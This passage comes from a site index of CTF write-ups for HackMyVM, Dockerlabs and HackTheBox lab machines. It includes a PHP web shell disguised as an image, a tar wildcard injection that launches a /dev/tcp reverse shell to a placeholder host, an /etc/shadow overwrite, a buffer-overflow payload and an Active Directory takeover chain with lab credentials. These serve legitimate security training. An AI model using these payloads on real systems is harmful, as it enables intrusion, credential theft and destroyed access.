paul.\nWe enter the file bootstrap.min.css and find the following information that may be useful to us.\nWe test the address /yay/mysecretsound.wav, and indeed, it exists. We download the audio.\nUpon listening to the audio, you realize it might be in Morse code. So, you go to the morsecode.world website to upload the audio and have it decoded.\nResult\rI attempted to log in via SSH with the username paul and the password ETAIE4SIET, but it didn\u0026rsquo;t work. I noticed a word formed in the audio at the bottom, so I used \u0026ldquo;dancingpassyd\u0026rdquo; as the password and successfully logged in.\nNow, with the ls command, we see that we have the user flag.\nPrivilege escalation We use the sudo -l command to view the actions we can perform with sudo as root while being the user paul. As a result, we see that we can execute the /usr/bin/ln binary with sudo as if we were root without needing to know their password.\nWe go to the GTFOBins website and look for information on how to escalate privileges using the sudo ln command.\nSearch result on GTFOBins\rWe copy the commands and execute them:\nsudo ln -fs /bin/sh /bin/ln sudo ln We have successfully become the root and we can obtain their flag.\ncat /root/root.txt ","permalink":"http://localhost:1313/writeups/easy/helium/","summary":"Difficulty: Easy 🟢","title":"Helium - HackMyVM"},{"content":"\rMachine Link\nTo start, we will perform a port scan to identify which ports are open.\nNMAP port scan\rSo the first thing I do is go to the website hosting this machine. And we come across a challenge:\nChallenge 1\rWhat is observed when inspecting the page\rI decide to search on dCode for the type of symbol encryption the level 1 puzzle could be, and I finally find it:\nCipher with Rosicrucian Cipher\rDecryption\rWe decrypt it and obtain SYS.HIDDEN.HMV, which seems to be like a domain. So, I decide to save it in /etc/hosts:\nNow I search again for the website, and we come across level 2:\nChallenge 2\rAs I don\u0026rsquo;t see anything on the page, I decide to use Gobuster to enumerate subdirectories.\nEnumeration of subdirectories with Gobuster\rIt gives us this result, but /users and /members are just a rabbit hole, and the directory that will be useful is /weapon. Although it is initially empty, when scanning it again with Gobuster, we find that it contains a PHP file.\nWe found an interesting PHP file\rAfter trying for a while to view the code within loot.php and not making any progress, along with other futile attempts, I decide to use wfuzz to check if we can execute any commands with this PHP file.\nWe found the keyword to execute commands\rAnd we find the keyword that we should use to execute commands. This way, we can now access the machine by running a Reverse Shell.\nExecuting commands as www-data\rAs we can see, we can execute commands as www-data, so we set up a listener on port 4444 and execute the Reverse Shell.\nWe are inside the machine\rI decide to set up the TTY for convenience, and it would look something like this.\nLet\u0026rsquo;s see which users exist on this machine.\ngrep /bin/bash /etc/passwd System users\rAnd we observe that there are three users:\ntoreto atenea root Now, by running sudo -l, we see that we can execute Perl as the user toreto.\nThis allows us to escalate privileges to become toreto quite easily. The first thing we need to do is go to a directory where we have write permissions, such as the /tmp directory, and there we will create a Perl file and execute it as the toreto user.\nHere is the Perl code:\necho -ne \u0026#39;#!/bin/perl \\nuse POSIX qw(setuid); \\nPOSIX::setuid(0); \\nexec \u0026#34;/bin/bash\u0026#34;;\u0026#39; \u0026gt; script.pl And we execute it like this:\nsudo -u toreto /usr/bin/perl script.pl This will allow us to obtain the shell of toreto.\nWe are the user toreto\rI\u0026rsquo;ve tried sudo -l, looking to see if any SUID binaries could be useful, and I\u0026rsquo;ve even checked the capabilities, but found nothing. So, I decided to search through directories, and in the end, I found a file that will help us escalate privileges to the atenea user.\nWe found a text file\rThe text file is a dictionary.\nSo I use Hydra to perform a brute-force attack on the SSH port (22) with the user atenea, using this dictionary to check if any combination is the correct password.\nWe found the password for atenea\rAnd the password is sys8423hmv, so we log in via SSH:\nWe are atenea\rNow we can obtain the user flag:\nNext, let\u0026rsquo;s escalate privileges to become the root user. By running sudo -l, we see that we can execute socat as if we were root without password.\nI search on GTFOBins and find that we can easily escalate privileges.\nsudo socat stdin exec:/bin/sh We run it, and there you go, we are now root.\nAnd we obtain the root flag.\nMachine pwned!!\n","permalink":"http://localhost:1313/writeups/easy/hidden/","summary":"Difficulty: Easy 🟢","title":"Hidden - HackMyVM"},{"content":"\rMachine Link\nWhen starting the machine, we see the IP of the victim machine.\nI decided to use NMAP to scan for open ports and obtain information about the services and other details associated with them.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn 192.168.18.181 nmap -sCV -p21,22,80 -n -Pn 192.168.18.181 -oN target We observed that port 21 (FTP) is vulnerable to anonymous login, so I decided to log in because the scan indicated there were files of interest\nNow that we are inside, I decide to download the file users.txt using the get command.\nget users.txth And on my local machine, I check to see what\u0026rsquo;s there, and it appears to be a dictionary. But at the bottom, we can notice a username (hmv).\nAfter downloading the id_rsa file, we discover that it’s actually a drawing of a rabbit.\nRabbit Hole reference\rAnd we observe that id_rsa.pem seems to be a private id_rsa key.\nI grant privileges to the private key and try to access, but it doesn\u0026rsquo;t work.\nIt seemed that the rabbit drawing was a hint that the id_rsa file was just a rabbit hole.\nI decide to go through port 80 (HTTP).\nHomepage\rSource code of the homepage\rWe can observe a value named \u0026lsquo;key\u0026rsquo; that contains some strange text. I notice that it\u0026rsquo;s an \u0026lsquo;.enc\u0026rsquo; file. We can decode the file using the RSA private key and OpenSSL.\nWe use the private key file and the downloaded file, and it generates a directory:\nopenssl pkeyutl -decrypt -inkey id_rsa.pem -in h4ckb1tu5.enc -out key cat key As it says it\u0026rsquo;s there, I decide to use Gobuster to search and see if there are any subdirectories or files within this directory.\nDirectory and file enumeration with Gobuster\rAnd we come across another id_rsa. So, I download it.\nwget http://192.168.18.181/softyhackb4el7dshelldredd/id_rsa As we can see, it appears to be a private key. Let\u0026rsquo;s see if it works:\nUnfortunately, it is asking for a password.\nFor the next step, we will need to download the image from the webpage and use steganography techniques to extract information from the image.\nwget http://192.168.18.181/logo.jpg I decide to use Stegseek with the dictionary we obtained earlier from port 21 (FTP).\nstegseek logo.jpg users.txt We obtain the password required by the private key, which allow us to access and log in as the user hmv.\nAnd we can obtain the user flag 🚩.\nPrivilege escalation to root There are only two users: hmv and root.\nAfter experimenting for a while and using tools like pspy and LinPeas without success, I decided to run the lse.sh script, which is designed to gather relevant information about local Linux system security to assist with privilege escalation.\nwget \u0026#34;https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh\u0026#34; -O lse.sh;chmod 700 lse.sh ./lse.sh -l1 This last command is used to display information in more detail.\nAs a result, we see that the /etc/shadow file can be edited.\nCritical file can be edited: /etc/shadow\rTo change the root password in the /etc/shadow file, we will use the following commands:\nopenssl passwd This is used to generate the password in hash format.\nSince I can\u0026rsquo;t edit the /etc/shadow file directly with a text editor like nano, we have to overwrite the entire file. Therefore, our only option is to run the following command:\necho root:e84V4zPcic2M2:18844:0:99999:7::: \u0026gt; /etc/shadow 🚨 IMPORTANT: This command is very dangerous because it completely overwrites the /etc/shadow file, deleting all existing user password hashes and settings except the line we add. This can lock out all other users and cause serious system access problems.\nWe are root now\rWe log in as the root user using our password. Once we have root access, we retrieve the root flag and successfully finish hacking the machine.\n","permalink":"http://localhost:1313/writeups/easy/hundred/","summary":"Difficulty: Easy 🟢","title":"Hundred - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/immortal/","summary":"Difficulty: Medium 🟠","title":"Immortal - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/very-easy/injection/","summary":"Difficulty: Very Easy 🔵","title":"Injection - Dockerlabs"},{"content":"\rMachine Link\nTo find the IP of the victim machine, I use the arp-scan command to discover the devices connected to my local network and locate the one whose** MAC address** starts with 08:, indicating it is a VirtualBox virtual machine.\nsudo arp-scan -I eth0 --localnet Next, we proceed with a quick scan using NMAP to see which ports are open.\nsudo nmap -sS --min-rate 4500 -n -Pn 192.168.18.163 Ports 22 and 80 are open\rAnd now we perform a more detailed scan on those open ports and save the result in a file called target.txt.\nnmap -sCV -p22,80 -n -Pn 192.168.18.163 -oN target.txt Detailed scan of the open ports\rWe observe a website hosted on this machine via port 80, but only the default Nginx homepage is visible.\nI use Gobuster to enumerate hidden files and directories. We find a file called note.txt that tells us the solution is to enumerate.\ngobuster dir -u http://192.168.18.163/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200 -b \u0026#34;\u0026#34; --exclude-length 3690 -x html,txt,xml,bak I decide to continue enumerating more directories and files (zip, htm, php, c).\nI come across the directory index.htm, which contains the following.\nIf you view the page source (Ctrl + U), you will see a hidden form that sends information using the GET method to a file called secret.php. This form has an input field named HackMyVM, and whatever is typed there is sent to the server when the form is submitted.\nContent of the hidden form\rNow, I am going to use Burp Suite to send a request including all the data we collected earlier.\nSend a request\rIt tells us to use another method. To do this, I will use the POST method. In Burp Suite, we have an option to convert from GET to POST and from POST back to GET with just the click of a button.\nSend a request with POST method\rIt says we already found it, so let\u0026rsquo;s put some value in the request.\nAnd we see that we have access to the victim machine as the user www-data (the web server user). I am going to send myself a Reverse Shell and set up the TTY.\nNow that we are inside, let\u0026rsquo;s enumerate the existing users on the machine.\ngrep /bin/bash /etc/passwd Existing users\rWe find two users: prakasaka and root.\nPrivilege escalation to Prakasaka I decided to navigate to prakasaka’s home directory, and as the www-data user, we can read the User Flag.\nThe next step to escalate privileges is to read the file secret.php, where we find the password for the user prakasaka.\nWe are prakasaka\rPrivilege escalation to Root Next, we run the command sudo -l to list the commands that the user prakasaka is allowed to execute with elevated sudo privileges.\nPrivilege escalation with the ip binary\rWe have permission to execute /bin/ip with root privileges. To escalate to root, let’s consult GTFObins and use the recommended commands for /bin/ip. Specifically, we will run the following commands to gain root access:\nsudo ip netns add foo sudo ip netns exec foo /bin/sh sudo ip netns delete foo We are finally the root user and can obtain the Root Flag.\n","permalink":"http://localhost:1313/writeups/easy/method/","summary":"Difficulty: Easy 🟢","title":"Method - HackMyVM"},{"content":"\rMachine Link\nTo begin, let\u0026rsquo;s find the IP of our target machine using arp-scan by executing the following command:\narp-scan -I eth0 --localnet 📝 NOTE: Normally, the MAC addresses of VirtualBox virtual machines start with 08:\nNow that we know its IP 192.168.18.169, let\u0026rsquo;s perform a port scan using NMAP to identify which ports are open, their services, and more information.\nNMAP scan\rSo now that we know it has ports 22 and 80 open, let\u0026rsquo;s access the web page hosted on this machine to see if we can find any useful information.\nIt tells us that the website is under maintenance, nothing more. So, I decide to use Gobuster to enumerate subdirectories, and I come across a text file named staff_statements.txt:\nGobuster enumeration\rstaff_statements.txt\rThe site is not yet repaired. Technicians are working on it by using old SSH connection files. Although the message doesn\u0026rsquo;t specify which files, I inferred it could involve older key files like id_rsa.bak rather than the current id_rsa. I searched for these old files, found them, and proceeded to download them.\nWe download id_rsa.bak\rNow that we have id_rsa.bak, we still need to know the username to log in. We already know the username since it is displayed when the machine starts:\nUser Jack\rBefore anything else, we need to grant permissions to the id_rsa.bak file with the following command:\nchmod 600 id_rsa.bak But when trying to access via SSH, it asks for a password, preventing us from entering.\nIt prevents us from accessing.\rSo, we can use John the Ripper to crack the password.\nssh2john id_rsa.bak \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash John the Ripper result\rNow that we know the password, we can access.\nWe are the user Jack\rI decide, first of all, to check the users on this machine.\ngrep /bin/bash /etc/passwd Users on the machine\rAnd we find 3 users: jack, helder, root.\nNow it\u0026rsquo;s time for privilege escalation. In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection. Now, /usr/bin/bash has the SUID bit set. Simply running the command bash -p grants us root privileges.\nbash -p All the previous process\rFinally, we navigate to the /root directory and obtain the root flag.\n","permalink":"http://localhost:1313/writeups/easy/ripper/","summary":"Difficulty: Easy 🟢","title":"Ripper - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/easy/showtime/","summary":"Difficulty: Easy 🟢","title":"ShowTime - Dockerlabs"},{"content":"\rMachine Link\nThe first thing we will do is perform a quick Nmap scan to see which ports are open.\nOnce we know the open ports, we will perform a more detailed scan on them to identify the services running and their versions.\nThe target machine is hosting an SSH server and a website. When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained! We log in as root and finally get the Root Flag.\nMachine completed!!\n","permalink":"http://localhost:1313/writeups/medium/silentdev/","summary":"Difficulty: Medium 🟠","title":"SilentDev - By me"},{"content":"\rMachine Link\nTo begin with, we perform a quick scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 192.168.1.233 Now with these open ports, we will run a more intensive scan to check which services are running behind them and their respective versions, saving the result in a file called target.\nThis version of FTP is not vulnerable to anonymous login, so what we’ll do is access the website hosted on the victim machine.\nWhen entering, we find this page, and when we click on any of the buttons at the bottom, we can view the contents of a file.\nOther than that, I don’t see anything interesting, so with the Gobuster tool we will enumerate subdirectories and files to see what we can find.\nNow we can start to understand what might be happening behind the \u0026ldquo;themes\u0026rdquo; parameter we saw earlier, because when we access /config.txt, we see the same content.\nThe file name passed through the parameter is encoded in some way, and if we pay attention, we see that the letters correspond to others and with a certain logic. In the end, we discovered that it is encoded with ROT13.\nI try reading a system file like /etc/passwd, and it works. It is vulnerable to LFI(Local File Inclusion).\nWe can’t access the /logs directory, but if we try enumerating inside it with Gobuster to see what\u0026rsquo;s there, we find a file.\nThey are the FTP server logs, where we see that two files were uploaded, which could be very useful for us.\nThe first file is a Python program that starts the FTP server and logs all connections and uploaded or downloaded files to a file.\nIt also gives us the password to access.\nThe second one is a reverse shell.\nIt looks like the rev.sh file is trying to give us a hint of where this is going. What we could do is insert a Reverse Shell inside the ftp_server.py itself, so when the machine boots up and runs the script to start the FTP server, the Reverse Shell executes as well, granting access to the machine.\nRevshell created in: Revshells.com\rI create the script with the payload included on my local machine, access via FTP, and replace it.\nInsert the payload\rWe also see that the files belong to the root user.\nNow, just start listening on port 4444, restart the victim machine, and wait for the shell to connect.\nWe get direct access as Root and capture the flags.\nMachine completed!! 💻🔥\n","permalink":"http://localhost:1313/writeups/very-easy/thirteen/","summary":"Difficulty: Very Easy 🔵","title":"Thirteen - HackMyVM"},{"content":"\rTo start, we perform a quick scan with Nmap to identify which ports are open on the target machine.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.72 Now we will perform a more detailed scan on these ports.\nnmap -sCV -p53,80,135,139,389,445,3269,49712,49727 -n -Pn 10.10.11.72 -oN target Let\u0026rsquo;s add the domain to /etc/hosts.\nHTB provides us with initial credentials for a user named Henry.\nhenry : H3nry_987TGV! There’s nothing we can do with the website hosted on port 80, so the next step is to use SMBMap to enumerate SMB shares on the host and check read/write permissions, which could allow us to access sensitive files or upload malicious files.\nsmbmap -H tombwatcher.htb -u henry -p H3nry_987TGV! After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain. (Quick guide on installing and using BloodHound: BloodHound)\nWe obtain domain information using the following command:\nbloodhound-python -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;henry\u0026#39; -p \u0026#39;H3nry_987TGV!\u0026#39; -gc \u0026#39;dc01.tombwatcher.htb\u0026#39; -ns 10.10.11.72 -v --zip -c all Then we upload the resulting ZIP file to BloodHound.\nWe search for the user Henry and find that we have WriteSPN permission on the user Alfred.\nHaving WriteSPN on another user means we can modify their SPN, which is a unique identifier linking a user or service account to a service in the domain for Kerberos authentication. This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly. This way, we can simulate the domain time and make Kerberos work.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; ./targetedKerberoast.py -v -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;henry\u0026#39; -p \u0026#39;H3nry_987TGV!\u0026#39; We copy the hash and crack it with John The Ripper.\njohn -w=/usr/share/wordlists/rockyou.txt hash_alfred With access to the Alfred account, we look in BloodHound for a new way to escalate to another user.\nAs we can see, we have the ability to add Alfred to the INFRASTRUCTURE group. Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password. In this case, we use bloodyAD instead of impacket-owneredit because it allows us to work directly with account hashes in a simpler and more reliable way to change passwords without needing the plaintext password.\nbloodyAD --host 10.10.11.72 -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;ansible_dev$\u0026#39; -p \u0026#39;:ecb4146b3f99e6bbf06ca896f504227c\u0026#39; set password SAM \u0026#39;sam123\u0026#39;\r[+] Password changed successfully! Now that we have access to Sam, we can take advantage of his WriteOwner on John, which means we can change the owner of John’s account and modify his permissions to take control of his account or escalate privileges within the domain.\nimpacket-owneredit -action write -new-owner \u0026#39;sam\u0026#39; -target \u0026#39;john\u0026#39; \u0026#39;tombwatcher.htb/sam:sam123\u0026#39; impacket-dacledit -action \u0026#39;write\u0026#39; -rights \u0026#39;FullControl\u0026#39; -principal \u0026#39;sam\u0026#39; -target \u0026#39;john\u0026#39; \u0026#39;tombwatcher.htb\u0026#39;/\u0026#39;sam\u0026#39;:\u0026#39;sam123\u0026#39; Now, taking advantage of the fact that Sam has FullControl over John, we change John’s password using BloodyAD with the following command:\nbloodyAD --host 10.10.11.72 -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;sam\u0026#39; -p \u0026#39;sam123\u0026#39; set password john \u0026#39;john123\u0026#39; With the user John, we can access his account and obtain the User Flag, which is located in his Desktop folder.\nWe now have control of the user John, who has GenericAll over the ADCS OU. This OU corresponds to the Active Directory Certificate Services infrastructure, which manages certificate issuance and usage within the domain.\nWith this control, we can abuse the certificate configuration, and to do so, we use Certipy-AD, which allows us to enumerate, create, and request misconfigured certificates to escalate privileges within the domain.\ncertipy-ad find -u \u0026#39;john@tombwatcher.htb\u0026#39; -p \u0026#39;john123\u0026#39; -dc-ip 10.10.11.72 In the WebServer certificate template, we encounter a SID (S-1-5-21-1392491010-1358638721-2126982587-1111), so we decide to search the system to see which user or group it belongs to.\nGet-ADObject -Filter {ObjectSID -eq \u0026#34;S-1-5-21-1392491010-1358638721-2126982587-1111\u0026#34;} -Properties * Nothing is found, so this SID likely corresponds to a deleted user or group or a special internal domain object that no longer exists.\nTo verify if the SID corresponds to a deleted object in Active Directory, you can use PowerShell with the ActiveDirectory module and search in the Deleted Objects tomb.\nGet-ADObject -Filter {ObjectSID -eq \u0026#34;S-1-5-21-1392491010-1358638721-2126982587-1111\u0026#34;} -IncludeDeletedObjects -Properties * This will search the deleted objects and show whether that SID corresponds to a deleted user or group.\nResult:\n*Evil-WinRM* PS C:\\Users\\john\\Desktop\u0026gt; Get-ADObject -Filter {ObjectSID -eq \u0026#34;S-1-5-21-1392491010-1358638721-2126982587-1111\u0026#34;} -IncludeDeletedObjects -Properties *\raccountExpires : 9223372036854775807\rbadPasswordTime : 0\rbadPwdCount : 0\rCanonicalName : tombwatcher.htb/Deleted Objects/cert_admin\rDEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf\rCN : cert_admin\rDEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf\rcodePage : 0\rcountryCode : 0\rCreated : 11/16/2024 12:07:04 PM\rcreateTimeStamp : 11/16/2024 12:07:04 PM\rDeleted : True\rDescription :\rDisplayName :\rDistinguishedName : CN=cert_admin\\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb\rdSCorePropagationData : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}\rgivenName : cert_admin\rinstanceType : 4\risDeleted : True\rLastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb\rlastLogoff : 0\rlastLogon : 0\rlogonCount : 0\rModified : 11/16/2024 12:07:27 PM\rmodifyTimeStamp : 11/16/2024 12:07:27 PM\rmsDS-LastKnownRDN : cert_admin\rName : cert_admin\rDEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf\rnTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity\rObjectCategory :\rObjectClass : user\rObjectGUID : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf\robjectSid : S-1-5-21-1392491010-1358638721-2126982587-1111\rprimaryGroupID : 513\rProtectedFromAccidentalDeletion : False\rpwdLastSet : 133762504248946345\rsAMAccountName : cert_admin\rsDRightsEffective : 7\rsn : cert_admin\ruserAccountControl : 66048\ruSNChanged : 13197\ruSNCreated : 13186\rwhenChanged : 11/16/2024 12:07:27 PM\rwhenCreated : 11/16/2024 12:07:04 PM We can restore the deleted user cert_admin because it is still in the Deleted Objects tomb of Active Directory. This is confirmed by several indicators in the information we obtained: isDeleted: True shows the object exists but is deleted, and LastKnownParent: OU=ADCS shows where it was located before deletion. Additionally, since we have GenericAll over the ADCS OU with the user John, we have the necessary permissions to restore it.\nGet-ADObject -Filter {ObjectSID -eq \u0026#34;S-1-5-21-1392491010-1358638721-2126982587-1111\u0026#34;} -IncludeDeletedObjects | Restore-ADObject Next, we perform a new domain mapping from inside, using SharpHound.exe.\nwget https://github.com/SpecterOps/SharpHound/releases/download/v2.7.1/SharpHound_v2.7.1_windows_x86.zip\runzip SharpHound_v2.7.1_windows_x86.zip We upload the executable to the machine with Evil-WinRM:\nupload SharpHound.exe And run a full domain scan.\n.\\SharpHound.exe -c All -d tombwatcher.htb Finally, we download the resulting ZIP file using the download command followed by the file name.\nWe upload it to BloodHound, which now shows much more information about John than before.\nThe Cert_Admin user has been successfully restored, and since we have GenericAll over it, we proceed to change its password.\nbloodyAD --host 10.10.11.72 -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;john\u0026#39; -p \u0026#39;john123\u0026#39; set password \u0026#39;cert_admin\u0026#39; \u0026#39;admin1234\u0026#39;\r[+] Password changed successfully! We then run Certipy-ad again, but this time using the Cert_Admin user to search for vulnerable certificates.\ncertipy-ad find -u cert_admin -p \u0026#39;admin1234\u0026#39; -dc-ip 10.10.11.72 -vulnerable Result:\nCertificate Authorities\r0\rCA Name : tombwatcher-CA-1\rDNS Name : DC01.tombwatcher.htb\rCertificate Subject : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb\rCertificate Serial Number : 3428A7FC52C310B2460F8440AA8327AC\rCertificate Validity Start : 2024-11-16 